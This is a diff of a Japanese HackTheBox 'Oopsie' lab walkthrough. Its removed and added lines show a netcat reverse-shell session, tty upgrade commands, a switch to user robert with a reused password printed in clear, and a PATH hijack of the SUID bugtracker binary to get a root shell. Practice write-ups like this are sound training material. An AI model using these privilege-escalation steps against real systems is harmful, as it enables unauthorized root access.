@@ -156,42 +156,35 @@ mysqlのアカウントであるが，パスワードの使いまわしなどが
 robertユーザにスイッチできるかを試す．
 mysqli_connectは現在非推奨の関数らしい．
 
-
 ```
 $ su robert
 su: must be run from a terminal
+```
 
+しかし初期の設定ではエラーが発生する．
+そこでシェルをパワーアップさせる．
+/dev/nullはエラーメッセージを見たくないときに使う．
 
-
-^Z
-zsh: suspended  nc -lnvp 1234
-                                                                                                             
-┌──(kali㉿kali)-[~/Documents/htb/starting_point]
-└─$ nc -lnvp 1234                                                                                  148 ⨯ 1 ⚙
-listening on [any] 1234 ...
-connect to [10.10.14.176] from (UNKNOWN) [10.10.10.28] 51150
-Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
- 09:16:44 up  3:16,  0 users,  load average: 0.00, 0.00, 0.00
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-/bin/sh: 0: can't access tty; job control turned off
-$ su robert
-su: must be run from a terminal
-$ cd ~
-/bin/sh: 2: cd: can't cd to ~
-$ su tobert
-su: must be run from a terminal
-$ python3 -c 'import pty; pty.spawn*
-> 
-> ;
-> ^Z
-zsh: suspended  nc -lnvp 1234
-                                                                                                             
-
+```
 $ SHELL=/bin/bash script -q /dev/null
 www-data@oopsie:/$ su robert
 su robert
 Password: M3g4C0rpUs3r!
+```
+
+または以下のコマンドでもOK．
+
+```
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+idコマンドでグループを確認する．
+そこで属していたbugtrackerの調査する．
+
+```
+robert@oopsie:/$ id
+id
+uid=0(root) gid=1000(robert) groups=1000(robert),1001(bugtracker)
 
 robert@oopsie:/$ /usr/bin/bugtracker
 /usr/bin/bugtracker
@@ -216,7 +209,10 @@ Synchronized browsing to be enabled since it is enabled for that site.
 
 What happened instead:
 Synchronized browsing is disabled. Even choosing VIEW > SYNCHRONIZED BROWSING from menu does not stay enabled between connects.
+```
 
+
+```
 robert@oopsie:/$ export PATH=/tmp:$PATH
 export PATH=/tmp:$PATH
 robert@oopsie:/$ cd /tmp
@@ -237,9 +233,7 @@ Provide Bug ID: 1
 1
 ---------------
 
-# id
-id
-uid=0(root) gid=1000(robert) groups=1000(robert),1001(bugtracker)
+
 # cd /root
 lcd /root
 # ls
@@ -252,7 +246,13 @@ reports  root.txt  root.txt~
 cat root.txt
 # more root.txt
 more root.txt
-af13b0bee69f8a877c3faf667f7beacf
+af13..................
+```
+
+以下のファイルは次回以降に使うらしい．
+configディレクトリの中身はチェックするといいらしい．
+
+```
 # ls -la
 ls -la
 total 52
@@ -270,12 +270,6 @@ drwxr-xr-x  2 root root   4096 Aug 31 07:21 reports
 -rw-r--r--  1 root robert   33 Aug 31 07:09 root.txt~
 drwx------  2 root root   4096 Jan 23  2020 .ssh
 -rw-------  1 root root   1325 Mar 20  2020 .viminfo
-# more /root/.config/FileZilla
-more /root/.config/FileZilla
-more: stat of /root/.config/FileZilla failed: No such file or directory
-# more /root/.config/FileZilla
-more /root/.config/FileZilla
-more: stat of /root/.config/FileZilla failed: No such file or directory
 # cd .config
 cd .config
 # ls
